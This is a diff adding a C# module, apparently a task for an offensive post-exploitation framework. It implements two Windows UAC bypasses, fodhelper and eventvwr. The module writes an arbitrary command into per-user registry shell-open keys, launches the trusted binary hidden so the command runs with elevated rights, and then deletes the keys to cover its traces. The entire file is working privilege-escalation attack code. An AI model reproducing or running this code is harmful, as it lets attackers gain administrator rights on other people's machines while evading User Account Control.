@@ -1,0 +1,76 @@
+﻿using System;
+using Microsoft.Win32;
+using System.Threading;
+using System.Diagnostics;
+
+public static class Task
+{
+    public static string Execute(string registryKey, string command)
+    {
+		try
+		{
+			RegistryKey alwaysNotify = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
+            string consentPrompt = alwaysNotify.GetValue("ConsentPromptBehaviorAdmin").ToString();
+            string secureDesktopPrompt = alwaysNotify.GetValue("PromptOnSecureDesktop").ToString();
+            alwaysNotify.Close();
+			
+			if (consentPrompt == "2" & secureDesktopPrompt == "1")
+            {
+                return "UAC is set to Always Notify. Not performing UAC bypass.";
+            }
+		}
+		catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+		
+		if (registryKey.ToLower() == "fodhelper")
+		{
+			try
+			{		
+				RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
+				newkey.CreateSubKey(@"ms-settings\Shell\Open\command");
+
+				RegistryKey fod = Registry.CurrentUser.OpenSubKey(@"Software\Classes\ms-settings\Shell\Open\command", true);
+				fod.SetValue("DelegateExecute", "");
+				fod.SetValue("", @command);
+				fod.Close();
+
+				Process p = new Process();
+				p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+				p.StartInfo.FileName = "C:\\windows\\system32\\fodhelper.exe";
+				p.Start();
+
+				Thread.Sleep(10000);
+				
+				newkey.DeleteSubKeyTree("ms-settings");
+				return "Fodhelper UAC bypass executed";
+			}
+			catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+		}
+		else if (registryKey.ToLower() == "eventvwr")
+		{
+			try
+			{
+				RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
+				newkey.CreateSubKey(@"mscfile\Shell\Open\command");
+
+				RegistryKey vwr = Registry.CurrentUser.OpenSubKey(@"Software\Classes\mscfile\Shell\Open\command", true);
+				vwr.SetValue("", @command);
+				vwr.Close();
+
+				Process p = new Process();
+				p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+				p.StartInfo.FileName = "C:\\windows\\system32\\eventvwr.exe";
+				p.Start();
+
+				Thread.Sleep(10000);
+
+				newkey.DeleteSubKeyTree("mscfile");
+				return "Eventvwr UAC bypass executed.";
+			}
+			catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+		}
+		else
+		{
+			return "Invalid bypass selected. Select either 'fodhelper' or 'eventvwr.'";
+		}
+    }
+}
